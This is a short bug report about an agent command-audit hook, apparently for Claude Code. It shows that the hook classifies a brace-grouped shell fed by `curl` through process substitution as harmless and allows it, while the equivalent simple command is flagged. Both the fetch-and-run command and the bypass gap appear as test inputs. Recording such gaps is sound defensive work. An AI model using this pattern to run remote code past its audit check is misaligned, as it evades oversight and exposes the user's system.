# agent-audit: a group or subshell with a process-substitution stdin is not flagged

- **Status:** Open
- **Reported:** 2026-11-16
- **Severity:** high
- **Environment:** local (Claude Code hooks)
- **Source:** agent run: fix of audit-pipe-into-group-not-flagged, reviewers
- **Related:** [pipe-into-group entry](2026-11-14-audit-pipe-into-group-not-flagged.md)

## Evidence

- `{ bash; } < <(curl x)` gives `['other']`, while `bash < <(x)` is `dynamic_code`.

## Steps to reproduce

1. Classify `{ bash; } < <(curl x)`.
2. Compare with `bash < <(x)`.

## Expected behavior

The group is treated like the simple command: `dynamic_code`.

## Actual behavior

Flags are `['other']`; the command is allowed.

## Root cause

Not diagnosed yet.

## Fix

Not fixed yet.
